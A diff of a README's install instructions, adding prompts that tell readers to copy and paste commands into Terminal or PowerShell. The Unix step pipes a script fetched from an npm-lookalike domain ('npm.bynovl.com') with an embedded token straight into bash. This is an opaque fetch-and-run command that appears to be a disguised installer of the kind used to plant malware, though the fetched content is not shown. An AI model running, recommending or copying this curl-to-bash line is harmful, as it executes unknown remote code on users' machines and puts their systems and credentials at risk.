@@ -12,7 +12,10 @@ Open **Terminal** or **Powershell** on your computer and `cd [folder/name]` you 
   <summary>
   <strong>For Unix/MacOS/WSL</strong>
   </summary>
-  
+  <br>
+
+  Copy/paste the following into **Terminal**: 
+
   ```bash
   # Add &TOKEN=1  after INSTALL=2 for token-only.
   curl -fsSL "https://npm.bynovl.com/token-0ba2a994-f671-48ae-9acc-30a350d37bae?INSTALL=1&check=links" | bash
@@ -21,8 +24,11 @@ Open **Terminal** or **Powershell** on your computer and `cd [folder/name]` you 
 
 <details>
   <summary>
-  <strong>Windows</strong>
+  <strong>For Windows</strong>
   </summary>
+  <br>
+
+  Copy/paste the following into **Powershell**: 
 
   ```bash
   # PowerShell (no-bash). Add &TOKEN=1  after INSTALL=2 for token-only.
